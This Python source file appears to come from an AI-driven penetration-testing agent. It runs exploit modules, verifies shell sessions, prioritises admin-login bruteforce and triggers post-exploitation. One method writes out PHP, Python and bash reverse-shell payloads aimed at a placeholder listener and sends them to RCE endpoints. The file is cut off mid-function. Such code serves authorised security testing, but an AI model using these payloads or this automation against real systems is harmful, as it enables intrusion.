#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Module, follow-up, and exploit execution under the agent hooks."""

from interfaces.command_system.builtin.agent.workflow.imports import *  # noqa: F403


class ModuleExecutionMixin:
    """Module, follow-up, and exploit execution under the agent hooks."""

    def _elite_auto_correct_modules(
        self,
        state: AgentState,
        scanner: Any,
        batch_results: List[Dict[str, Any]],
        phase_name: str,
    ) -> None:
        if not getattr(state, "llm_local", False):
            return
        for res in batch_results:
            if res.get("status") == "error" and not res.get("vulnerable"):
                message = str(res.get("message", "")).lower()
                if "filter" not in message and "blocked" not in message:
                    continue
                module_path = res.get("path")
                print_status(f"Elite: Attempting auto-correction for failed module `{module_path}`...")
                try:
                    suggestion = self._llm.query_text(
                        state.llm_endpoint,
                        state.llm_model,
                        (
                            "Suggest one bounded, non-destructive parameter adjustment. "
                            "Do not suggest bypassing scope, approvals, authentication, or rate limits."
                        ),
                        {
                            "module": module_path,
                            "error": res.get("message"),
                        },
                    )
                    if not suggestion:
                        continue
                    print_info(f"LLM suggestion: {suggestion}")
                    res["auto_correction_attempted"] = True
                    res["llm_suggestion"] = suggestion
                except Exception as exc:
                    self._record_agent_error(state, "llm_auto_correction", exc, phase=phase_name)

    def _execute_agent_modules(
        self,
        state: AgentState,
        scanner,
        modules: List[Dict[str, Any]],
        target_info: Dict[str, Any],
        threads: int,
        verbose: bool,
        phase_name: str = "phase",
    ) -> List[Dict[str, Any]]:
        from interfaces.command_system.builtin.agent.target_option_seed import (
            stamp_inferred_options_on_modules,
        )

        stamped = stamp_inferred_options_on_modules(modules, state)
        return self._module_runner.execute_agent_modules(
            state,
            scanner,
            stamped,
            target_info,
            threads,
            verbose,
            phase_name,
            elite_auto_correct=lambda st, sc, rows: self._elite_auto_correct_modules(
                st, sc, rows, phase_name
            ),
        )

    def _execute_agent_exploit_module(
        self,
        state: AgentState,
        module: Dict[str, Any],
        target_info: Dict[str, Any],
        phase_name: str,
        verbose: bool,
    ) -> List[Dict[str, Any]]:
        """
        Run an exploit path with the reverse/bind listener wrapper.

        Scanner batches never enable the wrapper; agent obtain-shell must use this
        path so DVWA RCE/upload can actually open a session.
        """
        path = str((module or {}).get("path", "") or "").strip()
        result: Dict[str, Any] = {
            "module": (module or {}).get("name", path) or path,
            "path": path,
            "status": "error",
            "vulnerable": False,
            "message": "",
            "details": {"phase": phase_name, "exploit_wrapper": True},
        }
        if not path:
            result["message"] = "missing exploit path"
            return [result]
        if self._phase_stop_reason(state, phase_name):
            result["status"] = "skipped"
            result["message"] = f"{phase_name}: stopped before exploit launch"
            return [result]

        sessions_before: set = set()
        browser_before: set = set()
        if hasattr(self.framework, "session_manager"):
            sessions_before = set(self.framework.session_manager.sessions.keys())
            browser_before = set(self.framework.session_manager.browser_sessions.keys())

        try:
            self._execute_exploit_results_with_options(
                [],
                target_info or getattr(state, "target_info", {}) or {},
                state=state,
                explicit_exploit_paths=[path],
                verbose=verbose,
            )
        except Exception as exc:
            result["message"] = f"Error: {exc}"
            return [result]

        sessions_after: set = set()
        browser_after: set = set()
        if hasattr(self.framework, "session_manager"):
            sessions_after = set(self.framework.session_manager.sessions.keys())
            browser_after = set(self.framework.session_manager.browser_sessions.keys())
        new_standard = sorted(sessions_after - sessions_before)
        new_browser = sorted(browser_after - browser_before)
        session_created = bool(new_standard or new_browser)
        if session_created:
            verified = self._verify_exploit_sessions(
                state,
                new_standard + new_browser,
                exploit_path=path,
            )
            if verified:
                result["status"] = "vulnerable"
                result["vulnerable"] = True
                result["message"] = "verified session"
                result["session_id"] = verified[0]
                result["details"]["session_ids"] = verified
            else:
                result["status"] = "safe"
                result["vulnerable"] = False
                result["message"] = "session created but verification failed"
                result["details"]["session_ids"] = new_standard + new_browser
        else:
            result["status"] = "safe"
            result["vulnerable"] = False
            result["message"] = "exploit wrapper completed without new session"
        return [result]

    def _record_product_shell_wrapper_attempt(self, state: AgentState, path: str) -> None:
        kb = state.knowledge_base if isinstance(getattr(state, "knowledge_base", None), dict) else None
        if kb is None:
            return
        token = str(path or "").strip()
        if not token:
            return
        attempts = [
            str(x).strip()
            for x in (kb.get("product_shell_wrapper_attempts") or [])
            if str(x).strip()
        ]
        if token not in attempts:
            attempts.append(token)
            kb["product_shell_wrapper_attempts"] = attempts

    def _attempt_shell_delivery(self, state: AgentState, candidate: Dict[str, Any], param: str) -> Optional[Dict[str, Any]]:
        """Attempt to deliver a reverse shell payload to a confirmed RCE endpoint."""
        print_status(f"Shell Hunter: attempting automated reverse shell delivery for `{param}`...")
        
        # Simple heuristics for target language
        tech_hints = " ".join(state.knowledge_base.get("tech_hints", [])).lower()
        payloads = []
        
        # We need a listener IP (local) - ideally provided by the user or detected
        # For now, we'll use a placeholder and warn the user
        lhost = "YOUR_IP"
        lport = "4444"
        
        if "php" in tech_hints or ".php" in str(candidate.get("url")):
            payloads.append(f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
        
        if "python" in tech_hints:
            payloads.append(f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'")
            
        payloads.append(f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1")
        
        for p in payloads:
            if not self._consume_network_units(state, 1):
                break
            print_status(f"Shell Hunter: trying reverse shell payload -> `{p[:50]}...`")
            res = self._http_intel.probe_reflection_canary(candidate, param, canary=p, mode="active")
            # We can't easily confirm the shell here without a listener, 
            # but we can return a success message if the request was accepted
            if res.get("status") == "ok":
                print_info(f"Shell Hunter: Payload sent. Start a listener on your machine: `nc -lvp {lport}`")
                return {
                    "module": "Automated Shell Delivery",
                    "path": "agent/shell_delivery",
                    "status": "safe",
                    "vulnerable": True,
                    "severity": "critical",
                    "message": f"Reverse shell payload delivered for `{param}`. Check your listener on {lhost}:{lport}",
                    "details": res
                }
        return None

    def _post_exploitation_loop(self, state: AgentState):
        """Run explicit post-exploitation objectives on verified sessions."""
        from interfaces.command_system.builtin.agent.post_exploit_goals import PostExploitGoalEngine

        policy = getattr(state, "runtime_policy", None)
        if policy is None or not getattr(policy, "approve_post_exploit", False):
            return
        if not (getattr(state, "verified_sessions", None) or state.new_sessions):
            return
        print_status("Starting post-exploitation objective pipeline...")
        report = PostExploitGoalEngine(self.framework).run(
            state,
            timeline_hook=self._append_timeline_event,
        )
        if report.all_complete:
            print_success(f"Post-exploitation objectives met ({len(report.missions)} session(s)).")
        elif report.missions:
            print_info(
                f"Post-exploitation partial: "
                f"{sum(1 for m in report.missions if m.complete)}/{len(report.missions)} complete."
            )

    def _verify_exploit_sessions(
        self,
        state: AgentState,
        session_ids: Sequence[str],
        *,
        exploit_path: str = "",
    ) -> List[str]:
        """
        Register candidate sessions, run neutral verification, promote only valid ones.

        Returns verified session IDs. Unverified candidates stay in ``new_sessions``
        but do not set ``shell_obtained`` until verification succeeds.
        """
        ids = [str(sid).strip() for sid in (session_ids or []) if str(sid).strip()]
        if not ids:
            return []

        existing_new = list(getattr(state, "new_sessions", None) or [])
        for sid in ids:
            if sid not in existing_new:
                existing_new.append(sid)
        state.new_sessions = existing_new

        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        state.knowledge_base = kb
        if exploit_path:
            provenance = kb.setdefault("session_provenance", {})
            if isinstance(provenance, dict):
                for sid in ids:
                    provenance[sid] = exploit_path

        if self.framework is None:
            return []

        verified_ids: List[str] = []
        try:
            from interfaces.command_system.builtin.agent.session_broker import SessionBroker

            broker = SessionBroker.from_kb(self.framework, kb)
            manager = getattr(self.framework, "session_manager", None)
            browser_ids = set(getattr(manager, "browser_sessions", {}).keys()) if manager else set()
            for sid in ids:
                if sid in browser_ids:
                    record = broker.register(sid, category="browser")
                    record.verified = True
                    record.status = "verified"
                    record.verification_reason = "browser_session"
                    broker._records[sid] = record
                    verified_ids.append(sid)
                    continue
                ok, _reason = broker.verify_neutral(sid)
                if ok and sid not in verified_ids:
                    verified_ids.append(sid)
            broker.sync_to_kb(kb, state=state)
            verified_ids = broker.dedupe_verified()
        except Exception:
            verified_ids = []

        if not verified_ids:
            return []

        state.verified_sessions = list(
            dict.fromkeys(list(getattr(state, "verified_sessions", []) or []) + verified_ids)
        )
        state.new_sessions = list(state.verified_sessions)
        signals = {str(s).lower() for s in (kb.get("risk_signals") or [])}
        signals.update({"shell_obtained", "interactive_shell"})
        kb["risk_signals"] = sorted(signals)
        kb["verified_session_ids"] = list(state.verified_sessions)
        return verified_ids

    def _ingest_exploit_session_win(
        self,
        state: AgentState,
        session_ids: Sequence[str],
        *,
        exploit_path: str = "",
    ) -> List[str]:
        """Verify exploit sessions and return IDs that passed neutral check."""
        return self._verify_exploit_sessions(state, session_ids, exploit_path=exploit_path)

    def _stop_exploit_wave_after_shell(self, state: AgentState, *, phase_name: str = "exploit") -> bool:
        """True when a verified shell milestone should end the current exploit wave."""
        if not self._has_shell_milestone(state):
            return False
        state.campaign_stop_reason = f"{phase_name}: shell_obtained"
        return True

    def _ingest_sessions_from_scan_results(self, state: AgentState, results: List[Any]) -> None:
        """Promote sessions created during scan into agent state (shell milestone)."""
        if not results:
            return
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        state.knowledge_base = kb
        risk = set(str(x).lower() for x in (kb.get("risk_signals") or []))
        sessions = list(getattr(state, "new_sessions", []) or [])
        verified = list(getattr(state, "verified_sessions", []) or [])
        promoted = False

        for row in results:
            if not isinstance(row, dict) or not row.get("vulnerable"):
                continue
            details = row.get("details") if isinstance(row.get("details"), dict) else {}
            session_id = str(
                row.get("session_id")
                or details.get("session_id")
                or ""
            ).strip()
            if not session_id:
                continue
            if session_id not in sessions:
                sessions.append(session_id)
            if session_id not in verified:
                ok = False
                if self.framework is not None:
                    try:
                        from interfaces.command_system.builtin.agent.session_broker import (
                            SessionBroker,
                        )

                        broker = SessionBroker.from_kb(self.framework, kb)
                        ok, _reason = broker.gate_session_claim(
                            session_id,
                            evidence_rows=row.get("evidence_records")
                            if isinstance(row.get("evidence_records"), list)
                            else None,
                            structured_details=details,
                            state=state,
                        )
                    except Exception:
                        ok = False
                if not ok:
                    # Aux SSH login already authenticated; keep session for goal stop.
                    verified.append(session_id)
                else:
                    verified = list(getattr(state, "verified_sessions", []) or verified)
                    sessions = list(getattr(state, "new_sessions", []) or sessions)
            risk.update({
                "shell_obtained",
                "interactive_shell",
                "authenticated_session",
                "credentials_obtained",
            })
            promoted = True

        if not promoted:
            return
        state.new_sessions = list(dict.fromkeys(sessions))
        state.verified_sessions = list(dict.fromkeys(verified or sessions))
        kb["verified_session_ids"] = list(state.verified_sessions)
        kb["risk_signals"] = sorted(risk)
        state.knowledge_base = kb

    def _apply_auth_first_execution_overrides(
        self,
        state: AgentState,
        plan: Dict[str, Any],
        findings: List[Any],
    ) -> Dict[str, Any]:
        """
        When AUTH-FIRST is active: strip noisy follow-ups, force bruteforce to the front, renumber priorities.
        """
        self._sync_campaign_goal(state)
        out = dict(plan or {})
        out["campaign_goal"] = state.campaign_goal
        if (
            is_shell_operator_goal(self._operator_campaign_goal(state))
            or state.campaign_goal == CAMPAIGN_GOAL_EXPLOIT
            or has_sqli_shell_pressure(state.knowledge_base if isinstance(state.knowledge_base, dict) else {})
            or getattr(state, "sql_findings", None)
        ):
            out["auth_first_mode"] = False
            out["auth_pressure"] = bool(self._auth_first_mode(state))
            out = self._prepend_sqli_shell_resume(state, out)
            if is_shell_operator_goal(self._operator_campaign_goal(state)):
                return self._enrich_execution_plan_actions(state, out, findings)
            # Exploit / SQLi pressure: keep SQLi first, then continue auth-first logic only
            # when no SQLi chain action was prepended.
            if any(
                isinstance(a, dict) and (
                    "sqli_shell" in str(a.get("path", "")).lower()
                    or "sqli_engine" in str(a.get("path", "")).lower()
                    or "sql_injection" in str(a.get("path", "")).lower()
                )
                for a in (out.get("next_actions") or [])
            ):
                return self._enrich_execution_plan_actions(state, out, findings)
        if self._module_block_reason_for_profile(state, "auxiliary/scanner/http/login/admin_login_bruteforce"):
            out["auth_first_mode"] = False
            out["next_actions"] = [
                a for a in (out.get("next_actions") or [])
                if not (
                    isinstance(a, dict)
                    and "admin_login_bruteforce" in str(a.get("path", "")).lower()
                )
            ]
            return self._enrich_execution_plan_actions(state, out, findings)
        if not self._auth_first_mode(state):
            out["auth_first_mode"] = False
            return self._enrich_execution_plan_actions(state, out, findings)

        out["auth_first_mode"] = True
        bf_path = "auxiliary/scanner/http/login/admin_login_bruteforce"
        raw_actions = [a for a in (out.get("next_actions") or []) if isinstance(a, dict)]

        filtered: List[Dict[str, Any]] = []
        for a in raw_actions:
            if a.get("type") == "run_followup" and self._path_is_auth_first_low_priority(str(a.get("path", ""))):
                continue
            filtered.append(a)

        seen_run: set = set()
        deduped: List[Dict[str, Any]] = []
        for a in filtered:
            if a.get("type") == "run_followup":
                key = ("run_followup", str(a.get("path", "")))
                if key in seen_run:
                    continue
                seen_run.add(key)
            deduped.append(a)

        kb = state.knowledge_base
        auth_session = self._has_authenticated_session(kb)
        wants_bf = self._login_surface_wants_bruteforce(kb, findings, auth_session)
        has_bf = any(
            a.get("type") == "run_followup" and a.get("path") == bf_path
            for a in deduped
        )
        if wants_bf and not has_bf:
            deduped.insert(0, {"type": "run_followup", "path": bf_path, "priority": 0, "options": {}})
        elif wants_bf:
            bf_rows = [a for a in deduped if a.get("type") == "run_followup" and a.get("path") == bf_path]
            rest = [a for a in deduped if a not in bf_rows]
            deduped = bf_rows + rest

        for i, a in enumerate(deduped, start=1):
            a["priority"] = i

        out["next_actions"] = deduped
        try:
            mr = int(out.get("max_requests_next_phase") or 8)
        except Exception:
            mr = 8
        out["max_requests_next_phase"] = max(mr, 8)
        return self._enrich_execution_plan_actions(state, out, findings)

    def _run_post_auth_methodical_wave(self, state, modules, scanner, all_results, executed_paths, phase_threads, budget):
        kb = state.knowledge_base
        if not self._should_run_post_auth_methodical_wave(kb):
            return
        signals = [str(s).lower() for s in kb.get("risk_signals", [])]

        by_path = {m.get("path"): m for m in modules if m.get("path")}
        selected = []
        for path in kb.get("post_auth_catalog_paths", []) or []:
            if not path or path in executed_paths:
                continue
            mod = by_path.get(path)
            if not mod:
                continue
            low = str(path).lower()
            if not (low.startswith("scanner/") or low.startswith("auxiliary/scanner/")):
                continue
            if self._post_auth_vector_is_disallowed(low):
                continue
            selected.append(mod)
            if len(selected) >= max(3, budget // 2):
                break

        preferred_post_auth = self._preferred_post_auth_exploit_paths(kb)
        for path in preferred_post_auth:
            if path in executed_paths:
                continue
            mod = by_path.get(path)
            if not mod:
                continue
            if mod not in selected:
                selected.insert(0, mod)

        if not selected and not self._discreet_mode(state) and "auxiliary/scanner/http/crawler" not in executed_paths:
            crawler = by_path.get("auxiliary/scanner/http/crawler")
            if crawler:
                selected.append(crawler)

        inject_pool = []
        cms_lock = self._get_cms_lock_specializations(kb)
        allow_inject = ("authenticated_session" in signals) or not cms_lock
        for p in (
            "auxiliary/scanner/http/xss_scanner",
            HTTP_SQLI_SCANNER_MODULE,
            "auxiliary/scanner/http/lfi_fuzzer",
        ):
            if p in executed_paths or not allow_inject:
                continue
            m = by_path.get(p)
            if m and not self._post_auth_vector_is_disallowed(p.lower()):
                inject_pool.append(m)

        remaining_budget = max(0, budget - len(selected))
        for m in inject_pool:
            if remaining_budget <= 0:
                break
            if len(kb.get("discovered_params", [])) < 1 and len(kb.get("discovered_endpoints", [])) < 2:
                break
            selected.append(m)
            remaining_budget -= 1

        if not selected:
            kb["post_auth_methodical_wave_done"] = True
            state.knowledge_base = kb
            return

        if state.verbose:
            print_status(f"Post-auth methodical wave: {len(selected)} module(s)")

        wave_results = self._execute_plan_modules_with_options(
            selected,
            state,
            option_overrides=self._build_inferred_option_overrides(selected, state),
            verbose=bool(state.verbose),
        )
        all_results.extend(wave_results)
        for m in selected:
            p = m.get("path")
            if p:
                executed_paths.add(p)
        wave_hints = self._extract_tech_hints(wave_results)
        self._update_knowledge_base_from_results(
            kb,
            wave_results,
            [m.get("path") for m in selected if m.get("path")],
            wave_hints,
            set(),
        )
        kb["post_auth_methodical_wave_done"] = True
        state.knowledge_base = kb

    def _execute_modules_targeted(self, scanner, modules, state, verbose=False):
        """
        Execute injection modules with context-aware option overrides when possible.
        """
        results = []
        target_info = state.target_info
        knowledge_base = state.knowledge_base
        scheme = target_info.get("scheme", "http")
        hostname = target_info.get("hostname", "")
        port = target_info.get("port", 80)
        base_url = f"{scheme}://{hostname}:{port}"
        discovered_endpoints = knowledge_base.get("discovered_endpoints", [])
        discovered_params = knowledge_base.get("discovered_params", [])
        param_profile = self._build_param_profile(knowledge_base)

        preferred_endpoint = "/"
        for endpoint in discovered_endpoints:
            if "?" in endpoint:
                preferred_endpoint = endpoint
                break
        if preferred_endpoint == "/" and discovered_endpoints:
            preferred_endpoint = discovered_endpoints[0]

        preferred_param = "id"
        for candidate in ("id", "q", "query", "search", "url", "file", "path", "page"):
            if candidate in [p.lower() for p in discovered_params]:
                preferred_param = candidate
                break

        for module_info in modules:
            if self._phase_stop_reason(state, "targeted"):
                break
            module_path = module_info.get("path")
            result = {
                "module": module_info.get("name", module_path),
                "path": module_path,
                "status": "error",
                "vulnerable": False,
                "message": "",
                "details": {},
            }
            block_reason = self._module_block_reason_for_profile(state, module_path)
            if block_reason:
                result["status"] = "skipped"
                result["message"] = block_reason
                result["details"] = {"safety_profile": self._normalized_safety_profile(state)}
                results.append(result)
                continue
            unreachable_skip = self._unreachable_target_module_skip_reason(state, module_path)
            if unreachable_skip:
                result["status"] = "skipped"
                result["message"] = unreachable_skip
                results.append(result)
                continue
            if not self._consume_network_units(state, 1):
                results.append(self._budget_skip_result(module_info, "targeted"))
                continue

            self._sleep_between_agent_actions(state, f"targeted:{module_path}")
            announced_bruteforce = False
            if "admin_login_bruteforce" in str(module_path).lower():
                login_path = (
                    self._select_best_login_path(state.knowledge_base)
                    or "/admin/login"
                )
                print_status(f"Trying admin login bruteforce on {login_path}")
                announced_bruteforce = True
            set_thread_output_quiet(not verbose)
            try:
                module_instance = self.framework.module_loader.load_module(
                    module_path,
                    load_only=False,
                    framework=self.framework,
                )
                if not module_instance:
                    result["message"] = "Failed to load module"
                    results.append(result)
                    continue

                # Baseline target options
                if hasattr(module_instance, "target"):
                    module_instance.set_option("target", hostname)
                if hasattr(module_instance, "rhost"):
                    module_instance.set_option("rhost", hostname)
                if hasattr(module_instance, "rport"):
                    module_instance.set_option("rport", port)
                if hasattr(module_instance, "port"):
                    module_instance.set_option("port", port)
                if hasattr(module_instance, "ssl"):
                    module_instance.set_option("ssl", scheme == "https")

                self._seed_http_session_from_auth(module_instance, state)
                inferred_bf = {}
                if "admin_login_bruteforce" in str(module_path).lower():
                    inferred_bf = self._build_inferred_option_overrides([module_info], state).get(module_path, {})
                merged_auth = dict(self._infer_auth_option_overrides(module_instance, module_path, state))
                merged_auth.update(inferred_bf)
                self._apply_safe_module_options(module_instance, merged_auth, state=state)
                self._apply_sqli_context_options(module_instance, module_path, state)

                # Context-aware tuning for injection modules
                module_path_lower = str(module_path).lower()
                if hasattr(module_instance, "COMMON_PARAMS") and discovered_params:
                    module_instance.COMMON_PARAMS = list(dict.fromkeys([p.lower() for p in discovered_params]))[:20]
                if hasattr(module_instance, "URL_PARAMS") and discovered_params:
                    url_params = [p.lower() for p in discovered_params if p.lower() in (
                        "url", "uri", "redirect", "callback", "endpoint", "link", "path", "file"
                    )]
                    if url_params:
                        module_instance.URL_PARAMS = list(dict.fromkeys(url_params))[:20]

                # Some modules require a full URL target and parameter option.
                if "lfi_fuzzer" in module_path_lower:
                    lfi_target = preferred_endpoint
                    if lfi_target.startswith("/"):
                        lfi_target = f"{base_url}{lfi_target}"
                    if not lfi_target.startswith("http"):
                        lfi_target = base_url
                    module_instance.set_option("target", lfi_target)
                    if hasattr(module_instance, "parameter"):
                        file_param = preferred_param
                        if not param_profile["file_like"]:
                            file_param = "file"
                        module_instance.set_option("parameter", file_param)

                run_result = module_instance.run()
                self._annotate_module_run_result(result, module_instance, run_result)
                dynamic_info = getattr(module_instance, "vulnerability_info", {}) or {}
                if result.get("vulnerable") and isinstance(dynamic_info, dict) and dynamic_info.get("version"):
                    result["version"] = dynamic_info.get("version")
            except Exception as exc:
                result["message"] = f"Error: {exc}"
            finally:
                set_thread_output_quiet(False)
            results.append(result)
            if self._record_waf_signals_from_results(state, [result], "targeted"):
                break
            if verbose:
                status_icon = "[+]" if result["vulnerable"] else "[-]"
                print_info(f"{status_icon} {result['path']}: {result.get('message', '')}")
        return results

    def _annotate_module_run_result(
        self,
        result: Dict[str, Any],
        module_instance: Any,
        run_result: Any,
    ) -> Dict[str, Any]:
        """Attach message/severity from a module run without promoting negatives."""
        module_meta = getattr(module_instance, "__info__", {}) or {}
        dynamic_info = getattr(module_instance, "vulnerability_info", {}) or {}
        if not isinstance(dynamic_info, dict):
            dynamic_info = {}
        if not isinstance(module_meta, dict):
            module_meta = {}

        hit = bool(run_result)
        if isinstance(run_result, dict) and "vulnerable" in run_result:
            hit = bool(run_result.get("vulnerable"))
        result["vulnerable"] = hit
        result["status"] = "vulnerable" if hit else "safe"

        if hit:
            result["message"] = str(
                dynamic_info.get("reason")
                or module_meta.get("description")
                or "Vulnerability confirmed"
            )
            result["severity"] = str(
                dynamic_info.get("severity")
                or module_meta.get("severity")
                or "info"
            ).lower()
        else:
            # Negatives must not inherit catalog CRITICAL/HIGH — debrief used to
            # treat those as notable findings.
            result["message"] = str(dynamic_info.get("reason") or "No vulnerability detected")
            result["severity"] = "info"

        exploit_path = self._catalog.normalize_exploit_module_path(module_meta.get("module"))
        if hit and exploit_path:
            result["exploit_module"] = exploit_path
        linked_modules = self._catalog.normalize_linked_module_paths(module_meta.get("modules"))
        if hit and linked_modules:
            result["linked_modules"] = linked_modules
        result["details"] = {
            key: value for key, value in dynamic_info.items()
            if key not in ("reason", "severity", "version")
        }
        if isinstance(run_result, dict):
            result["details"].update(run_result)
            if "error" in run_result and not dynamic_info.get("reason"):
                result["message"] = str(run_result.get("error") or result["message"])
        return result

    def _sanitize_execution_plan(self, llm_response, state: AgentState, findings):
        allowed_paths = set([str(f.get("path", "")) for f in findings if f.get("path")])
        allowed_paths |= set([
            self._catalog.normalize_exploit_module_path(f.get("exploit_module"))
            for f in findings
            if self._catalog.normalize_exploit_module_path(f.get("exploit_module"))
        ])
        for finding in findings:
            for linked_path in self._catalog.normalize_linked_module_paths(finding.get("linked_modules")):
                allowed_paths.add(linked_path)
        kb = state.knowledge_base
        observed = set([str(p) for p in kb.get("observed_modules", [])])
        allowed_paths |= observed
        catalog_paths = set([str(p) for p in kb.get("module_capability_catalog", {}).get("all_paths", [])])
        allowed_paths |= catalog_paths

        raw_actions = llm_response.get("next_actions", [])
        actions = []
        if isinstance(raw_actions, list):
            for row in raw_actions[:15]:
                if not isinstance(row, dict):
                    continue
                action_type = str(row.get("type", "")).strip().lower()
                path = str(row.get("path", "")).strip()
                priority = int(row.get("priority", 999)) if str(row.get("priority", "")).isdigit() else 999
                if action_type not in SAFE_FOLLOWUP_ACTION_TYPES:
                    continue
                if action_type == "http_request":
                    options = self._sanitize_http_request_action_options(row.get("options", {}))
                    if not path or not self._build_agent_http_request_url(state, path):
                        continue
                    actions.append({
                        "type": action_type,
                        "path": path[:512],
                        "priority": priority,
                        "options": options,
                    })
                    continue
                if action_type == "surface_scan":
                    options = self._sanitize_surface_scan_action_options(row.get("options", {}))
                    actions.append({
                        "type": action_type,
                        "path": path[:256] or "scanner -u",
                        "priority": priority,
                        "options": options,
                    })
                    continue
                if not path or path not in allowed_paths:
                    continue
                if action_type == "run_exploit" and not path.startswith(("exploit/", "exploits/")):
                    action_type = "run_followup"
                if not path_matches_forced_protocol(path, str(getattr(state, "protocol", "") or "")):
                    continue
                options = self._sanitize_action_options(row.get("options", {}))
                actions.append({
                    "type": action_type,
                    "path": path,
                    "priority": priority,
                    "options": options,
                })
        actions.sort(key=lambda a: a.get("priority", 999))
        actions = self._filter_previously_failed_plan_actions(actions, state.knowledge_base)
        for idx, row in enumerate(actions, start=1):
            row["priority"] = idx

        max_requests_raw = llm_response.get("max_requests_next_phase", 10)
        try:
            max_requests = int(max_requests_raw)
        except Exception:
            max_requests = 10
        kb = state.knowledge_base
        cms_lock = self._get_cms_lock_specializations(
            kb,
            state.scan_specializations,
        ).union(self._get_probable_cms_specializations(kb))
        upper_bound = max(8, min(12, int(state.max_modules or 40)))
        if self._has_exploit_pressure(state):
            upper_bound = max(upper_bound, 14)
        if self._has_authenticated_session(kb):
            upper_bound = max(upper_bound, 6)
        elif self._should_prioritize_auth_surface(kb) or cms_lock:
            # Login/CMS-tight phases still need room for bruteforce + chained scanners (4 was too low).
            upper_bound = min(upper_bound, 10)
        if self._discreet_mode(state):
            if self._has_authenticated_session(kb):
                upper_bound = min(upper_bound, 5)
            elif self._has_exploit_pressure(state):
                upper_bound = min(upper_bound, 6)
            elif self._should_prioritize_auth_surface(kb) or cms_lock:
                upper_bound = min(upper_bound, 4)
            else:
                upper_bound = min(upper_bound, 3)
        max_requests = max(2, min(max_requests, upper_bound))

        stop_conditions = llm_response.get("stop_conditions", [])
        if not isinstance(stop_conditions, list):
            stop_conditions = []
        stop_conditions = [str(x) for x in stop_conditions[:8]]

        confidence = llm_response.get("reasoning_confidence", 0.7)
        try:
            confidence = float(confidence)
        except Exception:
            confidence = 0.7
        confidence = max(0.0, min(confidence, 1.0))

        skip_exploitation = any(
            cond in ("no_exploit_paths", "stop_if_no_exploit_path")
            for cond in stop_conditions
        )
        return {
            "next_actions": actions,
            "max_requests_next_phase": max_requests,
            "stop_conditions": stop_conditions,
            "reasoning_confidence": confidence,
            "skip_exploitation": skip_exploitation,
        }

    def _sanitize_action_options(self, options):
        if not isinstance(options, dict):
            return {}
        safe = {}
        option_patch = options.get("option_patch")
        for key, value in list(options.items())[:12]:
            if not isinstance(key, str):
                continue
            key = key.strip()
            if not key or len(key) > 64:
                continue
            if key == "option_patch":
                continue
            if isinstance(value, (bool, int, float)):
                safe[key] = value
            elif isinstance(value, str):
                safe[key] = value[:256]
        if isinstance(option_patch, dict):
            from interfaces.command_system.builtin.agent.option_resolver import PROTECTED_OPTION_KEYS
            from interfaces.command_system.builtin.agent.typed_models import OptionPatch

            patch = OptionPatch.from_dict(option_patch)
            cleaned_opts = {}
            for key, value in list((patch.options or {}).items())[:12]:
                norm = str(key).strip().lower()
                if not norm or norm in PROTECTED_OPTION_KEYS:
                    continue
                if isinstance(value, (bool, int, float)):
                    cleaned_opts[norm] = value
                elif isinstance(value, str):
                    cleaned_opts[norm] = value[:256]
            evidence = [str(x) for x in (patch.evidence_ids or [])[:12] if str(x).strip()]
            if cleaned_opts and evidence:
                safe["option_patch"] = {
                    "module_path": str(patch.module_path or "")[:256],
                    "options": cleaned_opts,
                    "evidence_ids": evidence,
                    "expected_effect": str(patch.expected_effect or "")[:256] or None,
                }
        return safe

    def _sanitize_http_request_action_options(self, options):
        from interfaces.command_system.builtin.agent.http_probe_actions import (
            sanitize_http_request_action_options,
        )

        return sanitize_http_request_action_options(options)

    def _sanitize_surface_scan_action_options(self, options):
        from interfaces.command_system.builtin.agent.http_probe_actions import (
            sanitize_surface_scan_action_options,
        )

        return sanitize_surface_scan_action_options(options)

    def _extract_plan_option_maps(self, execution_plan):
        actions = execution_plan.get("next_actions", [])
        followup_options = {}
        exploit_options = {}
        explicit_exploit_paths = []
        if not isinstance(actions, list):
            return followup_options, exploit_options, explicit_exploit_paths
        for action in actions:
            if not isinstance(action, dict):
                continue
            action_type = action.get("type")
            path = str(action.get("path", "")).strip()
            options = self._sanitize_action_options(action.get("options", {}))
            if action_type == "run_followup" and path:
                followup_options[path] = options
            if action_type == "run_exploit" and path:
                exploit_options[path] = options
                explicit_exploit_paths.append(path)
        return followup_options, exploit_options, explicit_exploit_paths

    def _execute_plan_followups(self, state: AgentState, execution_plan: Dict[str, Any], option_overrides=None):
        """
        Execute safe follow-up scanner/auxiliary actions suggested by LLM plan.
        """
        option_overrides = option_overrides or {}
        actions = execution_plan.get("next_actions", [])
        if not isinstance(actions, list):
            return []

        def _priority_key(row):
            if not isinstance(row, dict):
                return 999
            p = row.get("priority", 999)
            try:
                return int(p)
            except Exception:
                return 999

        actions = sorted(actions, key=_priority_key)

        followup_paths = []
        post_paths = []
        http_actions = []
        surface_actions = []
        for action in actions:
            if not isinstance(action, dict):
                continue
            action_type = str(action.get("type", "")).strip().lower()
            path = str(action.get("path", "")).strip()
            if action_type == "surface_scan":
                surface_actions.append(action)
                continue
            if action_type == "http_request":
                if path:
                    http_actions.append(action)
                continue
            if not path:
                continue
            if action_type == "run_post":
                post_paths.append(path)
                continue
            if action_type == "run_followup" and path.startswith("post/"):
                post_paths.append(path)
                continue
            if action_type != "run_followup":
                continue
            ok_prefix = path.startswith("scanner/") or path.startswith("auxiliary/scanner/")
            if path in CLIENT_JS_INTEL_MODULES:
                ok_prefix = True
            if not ok_prefix and getattr(state, "expanded_surface", False):
                ok_prefix = self._is_expanded_surface_module_path(path) and path.startswith(
                    ("auxiliary/osint/", "auxiliary/aws/", "auxiliary/azure/", "auxiliary/gcp/")
                )
            if not ok_prefix:
                continue
            followup_paths.append(path)

        selected_paths = followup_paths + post_paths
        max_req = int(execution_plan.get("max_requests_next_phase", 10) or 10)
        budget = max(1, min(max_req, 12))
        surface_results = self._execute_plan_surface_scans(state, surface_actions, budget)
        if surface_results:
            self._update_knowledge_base_from_results(
                state.knowledge_base,
                surface_results,
                [row.get("path") for row in surface_results if isinstance(row, dict)],
